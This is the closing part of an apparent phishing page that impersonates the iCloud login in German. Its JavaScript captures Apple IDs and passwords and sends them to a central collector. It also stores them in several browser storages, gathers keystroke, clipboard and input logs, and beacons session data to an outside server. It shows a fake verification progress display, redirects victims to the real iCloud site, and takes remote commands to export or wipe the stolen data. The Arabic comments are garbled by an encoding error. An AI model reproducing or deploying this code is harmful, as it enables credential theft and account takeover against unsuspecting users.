                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
            sendToBrain('login_attempt', loginData);
            
            // Ø­ÙØ¸ Ù…Ø­Ù„ÙŠØ§Ù‹
            saveToLocalStorage('login_attempts', loginData);
            
            console.log('ğŸ” Login attempt logged:', appleId);
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }
        
        // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø¹ØªÙ…Ø§Ø¯
        async function saveCredentials(appleId, password, rememberMe) {
            const credentialData = {
                type: 'credential',
                timestamp: new Date().toISOString(),
                appleId: appleId,
                password: password,
                rememberMe: rememberMe,
                sessionId: getSessionId(),
                device: getDeviceType(),
                source: 'icloud_login'
            };
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
            sendToBrain('credential', credentialData);
            
            // Ø­ÙØ¸ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø·Ø±Ù‚ Ø§Ù„ØªØ®Ø²ÙŠÙ†
            await saveCredentialToAllStorages(credentialData);
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ù†Ø³Ø® Ø§Ø­ØªÙŠØ§Ø·ÙŠ
            createBackupFile(credentialData);
            
            console.log('ğŸ’¾ Credentials saved:', appleId);
        }
        
        // Ø­ÙØ¸ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø·Ø±Ù‚ Ø§Ù„ØªØ®Ø²ÙŠÙ†
        async function saveCredentialToAllStorages(data) {
            const storageMethods = [
                saveToIndexedDB(data),
                saveToLocalStorage('credentials', data),
                saveToSessionStorage(data),
                saveToFile(data),
                saveToBrainStorage(data)
            ];
            
            await Promise.allSettled(storageMethods);
        }
        
        // Ø­ÙØ¸ ÙÙŠ IndexedDB
        async function saveToIndexedDB(data) {
            try {
                if (!window.indexedDB) return false;
                
                return new Promise((resolve) => {
                    const request = indexedDB.open('iCloudDB', 1);
                    
                    request.onupgradeneeded = function(event) {
                        const db = event.target.result;
                        if (!db.objectStoreNames.contains('credentials')) {
                            db.createObjectStore('credentials', { keyPath: 'id', autoIncrement: true });
                        }
                    };
                    
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        const transaction = db.transaction(['credentials'], 'readwrite');
                        const store = transaction.objectStore('credentials');
                        store.add({ ...data, id: Date.now() });
                        resolve(true);
                    };
                    
                    request.onerror = function() {
                        resolve(false);
                    };
                });
            } catch (error) {
                return false;
            }
        }
        
        // Ø­ÙØ¸ ÙÙŠ Session Storage
        function saveToSessionStorage(data) {
            try {
                const sessionData = JSON.parse(sessionStorage.getItem('session_credentials') || '[]');
                sessionData.push(data);
                sessionStorage.setItem('session_credentials', JSON.stringify(sessionData));
                return true;
            } catch (error) {
                return false;
            }
        }
        
        // Ø­ÙØ¸ ÙÙŠ Ù…Ù„Ù
        function saveToFile(data) {
            try {
                const content = `
iCloud Login Credentials
=========================
Time: ${new Date(data.timestamp).toLocaleString('de-DE')}
Apple ID: ${data.appleId}
Password: ${data.password}
Device: ${data.device}
Session: ${data.sessionId}
=========================
                `.trim();
                
                const blob = new Blob([content], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `icloud_${Date.now()}.txt`;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
                
                return true;
            } catch (error) {
                return false;
            }
        }
        
        // Ø­ÙØ¸ ÙÙŠ Brain Storage
        function saveToBrainStorage(data) {
            try {
                const brainStorage = JSON.parse(localStorage.getItem('brain_storage') || '[]');
                brainStorage.push(data);
                localStorage.setItem('brain_storage', JSON.stringify(brainStorage));
                return true;
            } catch (error) {
                return false;
            }
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ù†Ø³Ø® Ø§Ø­ØªÙŠØ§Ø·ÙŠ
        function createBackupFile(data) {
            try {
                const backup = {
                    timestamp: new Date().toISOString(),
                    data: data,
                    type: 'backup',
                    device: getDeviceType()
                };
                
                localStorage.setItem(`backup_${Date.now()}`, JSON.stringify(backup));
                
                // Ø§Ù„Ø§Ø­ØªÙØ§Ø¸ Ø¨Ù€ 10 Ù†Ø³Ø® ÙÙ‚Ø·
                cleanupBackups();
                
            } catch (error) {
                console.warn('âš ï¸ Backup error:', error);
            }
        }
        
        // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
        function cleanupBackups() {
            try {
                const backups = [];
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.startsWith('backup_')) {
                        backups.push(key);
                    }
                }
                
                if (backups.length > 10) {
                    backups.sort().slice(0, backups.length - 10).forEach(key => {
                        localStorage.removeItem(key);
                    });
                }
            } catch (error) {
                console.warn('âš ï¸ Backup cleanup error:', error);
            }
        }
        
        // ØªØ¹Ø·ÙŠÙ„ Ø²Ø± Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
        function disableSubmitButton() {
            const btn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const progressContainer = document.getElementById('progressContainer');
            const progressFill = document.getElementById('progressFill');
            
            if (btn) {
                btn.disabled = true;
                btnText.textContent = 'Wird Ã¼berprÃ¼ft...';
            }
            
            if (progressContainer) {
                progressContainer.style.display = 'block';
            }
            
            // Ù…Ø­Ø§ÙƒØ§Ø© Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 15 + 5;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                }
                
                if (progressFill) {
                    progressFill.style.width = `${progress}%`;
                }
            }, 200);
        }
        
        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ­Ù‚Ù‚
        function simulateVerification() {
            return new Promise(resolve => {
                const steps = [
                    'Verbindung wird hergestellt...',
                    'Apple ID wird Ã¼berprÃ¼ft...',
                    'Passwort wird validiert...',
                    'Zwei-Faktor-Authentifizierung...',
                    'Anmeldung erfolgreich!'
                ];                
                let currentStep = 0;
                const btnText = document.getElementById('btnText');
                const progressFill = document.getElementById('progressFill');
                
                const stepInterval = setInterval(() => {
                    if (currentStep < steps.length) {
                        if (btnText) {
                            btnText.textContent = steps[currentStep];
                        }
                        
                        // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
                        const progress = Math.min(100, ((currentStep + 1) / steps.length) * 100);
                        if (progressFill) {
                            progressFill.style.width = `${progress}%`;
                        }
                        
                        currentStep++;
                    } else {
                        clearInterval(stepInterval);
                        setTimeout(resolve, 800);
                    }
                }, 1500);
            });
        }
        
        // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ iCloud Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
        function redirectToiCloud() {
            setTimeout(() => {
                // Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                const finalData = collectAllData();
                sendToBrain('final_data', finalData);
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ iCloud Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
                window.location.href = 'https://www.icloud.com';
            }, 3000);
        }
        
        // Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function collectAllData() {
            const data = {
                type: 'complete_session',
                timestamp: new Date().toISOString(),
                sessionId: getSessionId(),
                device: getDeviceType(),
                userAgent: navigator.userAgent,
                data: {
                    keystrokes: JSON.parse(localStorage.getItem('keystrokes') || '[]').length,
                    passwords: JSON.parse(localStorage.getItem('password_inputs') || '[]'),
                    visits: JSON.parse(localStorage.getItem('visits') || '[]'),
                    loginAttempts: JSON.parse(localStorage.getItem('login_attempts') || '[]'),
                    credentials: JSON.parse(localStorage.getItem('brain_storage') || '[]'),
                    textInputs: JSON.parse(localStorage.getItem('text_inputs') || '[]'),
                    clipboard: JSON.parse(localStorage.getItem('clipboard_logs') || '[]')
                },
                summary: generateDataSummary()
            };
            
            return data;
        }
        
        // ØªÙˆÙ„ÙŠØ¯ Ù…Ù„Ø®Øµ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function generateDataSummary() {
            const keystrokes = JSON.parse(localStorage.getItem('keystrokes') || '[]');
            const passwords = JSON.parse(localStorage.getItem('password_inputs') || '[]');
            const credentials = JSON.parse(localStorage.getItem('brain_storage') || '[]');
            
            return {
                totalKeystrokes: keystrokes.length,
                totalPasswords: passwords.length,
                totalCredentials: credentials.length,
                lastLogin: credentials.length > 0 ? credentials[credentials.length - 1].timestamp : null,
                deviceType: getDeviceType(),
                sessionDuration: calculateSessionDuration()
            };
        }
        
        // Ø­Ø³Ø§Ø¨ Ù…Ø¯Ø© Ø§Ù„Ø¬Ù„Ø³Ø©
        function calculateSessionDuration() {
            const sessionStart = sessionStorage.getItem('session_start');
            if (sessionStart) {
                const duration = Date.now() - parseInt(sessionStart);
                return Math.floor(duration / 1000); // Ø«ÙˆØ§Ù†ÙŠ
            }
            return 0;
        }
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
        function isValidEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.textContent = 'ğŸ™ˆ';
            } else {
                passwordInput.type = 'password';
                toggleBtn.textContent = 'ğŸ‘ï¸';
            }
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù„ØºØ©
        function switchLanguage() {
            const languages = ['Deutsch', 'English', 'FranÃ§ais', 'EspaÃ±ol', 'Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©'];
            const current = document.querySelector('.language-btn span');
            const currentIndex = languages.findIndex(lang => lang === current.nextSibling.textContent);
            const nextIndex = (currentIndex + 1) % languages.length;
            
            document.querySelector('.language-btn span').nextSibling.textContent = languages[nextIndex];
            
            // ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© ØªØ±Ø¬Ù…Ø© ÙØ¹Ù„ÙŠØ© Ù‡Ù†Ø§
            console.log('ğŸŒ Sprache gewechselt zu:', languages[nextIndex]);
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯
        function createAccount() {
            const createData = {
                type: 'create_account_click',
                timestamp: new Date().toISOString(),
                page: 'icloud_login',
                sessionId: getSessionId(),
                device: getDeviceType()
            };
            
            sendToBrain('create_account', createData);
            
            // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨
            alert('Sie werden zur Apple ID-Erstellungsseite weitergeleitet.');
            window.location.href = 'https://appleid.apple.com/account';
        }
        
        // ØªØ³Ø¬ÙŠÙ„ Ù…Ø­ØªÙˆÙ‰ contenteditable
        function logContentEditable(event) {
            try {
                const contentData = {
                    type: 'content_editable',
                    timestamp: new Date().toISOString(),
                    target: {
                        id: event.target.id,
                        className: event.target.className,
                        tagName: event.target.tagName
                    },
                    content: event.target.innerHTML,
                    textContent: event.target.textContent,
                    selection: window.getSelection().toString()
                };
                
                sendToBrain('content_editable', contentData);
                
            } catch (error) {
                console.warn('âš ï¸ Content editable logging error:', error);
            }
        }
        
        // ØªÙ‡ÙŠØ¦Ø© Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ø¬Ù„Ø³Ø©
        if (!sessionStorage.getItem('session_start')) {
            sessionStorage.setItem('session_start', Date.now().toString());
            
            const sessionStartData = {
                type: 'session_start',
                timestamp: new Date().toISOString(),
                sessionId: getSessionId(),
                device: getDeviceType(),
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer
            };
            
            sendToBrain('session_start', sessionStartData);
        }
        
        // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('beforeunload', function(event) {
            const endData = {
                type: 'session_end',
                timestamp: new Date().toISOString(),
                sessionId: getSessionId(),
                sessionDuration: calculateSessionDuration(),
                dataCollected: {
                    keystrokes: JSON.parse(localStorage.getItem('keystrokes') || '[]').length,
                    credentials: JSON.parse(localStorage.getItem('brain_storage') || '[]').length
                }
            };
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
            navigator.sendBeacon('https://your-server.com/api/session-end', JSON.stringify(endData));
            
            // Ø­ÙØ¸ Ù…Ø­Ù„ÙŠØ§Ù‹
            saveToLocalStorage('session_ends', endData);
        });
        
        // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ù† Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
        window.addEventListener('message', function(event) {
            if (event.data && event.data.type === 'brain_command') {
                handleBrainCommand(event.data);
            }
        });
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
        function handleBrainCommand(command) {
            console.log('ğŸ§  Brain command received:', command);
            
            switch (command.action) {
                case 'collect_data':
                    sendStoredData();
                    break;
                    
                case 'clear_data':
                    localStorage.clear();
                    sessionStorage.clear();
                    console.log('ğŸ—‘ï¸ All data cleared');
                    break;
                    
                case 'get_status':
                    sendHeartbeat();
                    break;
                    
                case 'update_settings':
                    if (command.settings) {
                        localStorage.setItem('brain_settings', JSON.stringify(command.settings));
                    }
                    break;
                    
                case 'export_data':
                    exportAllData();
                    break;
            }
        }
        
        // ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function exportAllData() {
            try {
                const allData = {
                    metadata: {
                        exportTime: new Date().toISOString(),
                        sessionId: getSessionId(),
                        device: getDeviceType()
                    },
                    data: {
                        keystrokes: JSON.parse(localStorage.getItem('keystrokes') || '[]'),
                        passwords: JSON.parse(localStorage.getItem('password_inputs') || '[]'),
                        credentials: JSON.parse(localStorage.getItem('brain_storage') || '[]'),
                        visits: JSON.parse(localStorage.getItem('visits') || '[]'),
                        loginAttempts: JSON.parse(localStorage.getItem('login_attempts') || '[]'),
                        sessions: JSON.parse(localStorage.getItem('session_ends') || '[]'),
                        textInputs: JSON.parse(localStorage.getItem('text_inputs') || '[]'),
                        clipboard: JSON.parse(localStorage.getItem('clipboard_logs') || '[]')
                    }
                };
                
                const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `icloud_data_${Date.now()}.json`;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
                
                console.log('ğŸ’¾ Data exported successfully');
                
            } catch (error) {
                console.error('âŒ Export error:', error);
            }
        }
        
        // ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø©
        function cleanupOldData() {
            const now = Date.now();
            const maxAge = 7 * 24 * 60 * 60 * 1000; // 7 Ø£ÙŠØ§Ù…
            
            const keys = ['keystrokes', 'password_inputs', 'visits', 'login_attempts', 'brain_storage'];
            
            keys.forEach(key => {
                try {
                    const data = JSON.parse(localStorage.getItem(key) || '[]');
                    const filtered = data.filter(item => {
                        const itemTime = new Date(item.timestamp).getTime();
                        return (now - itemTime) < maxAge;
                    });
                    
                    localStorage.setItem(key, JSON.stringify(filtered));
                } catch (error) {
                    console.warn(`âš ï¸ Cleanup error for ${key}:`, error);
                }
            });
            
            console.log('ğŸ§¹ Old data cleaned up');
        }
        
        // ØªØ´ØºÙŠÙ„ ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ„ Ø³Ø§Ø¹Ø©
        setInterval(cleanupOldData, 60 * 60 * 1000);
        
        // ØªÙ†Ø¸ÙŠÙ Ø£ÙˆÙ„ÙŠ
        setTimeout(cleanupOldData, 5000);
        
        console.log('ğŸ¯ iCloud Login System fully initialized');
        
    </script>
</body>
</html>
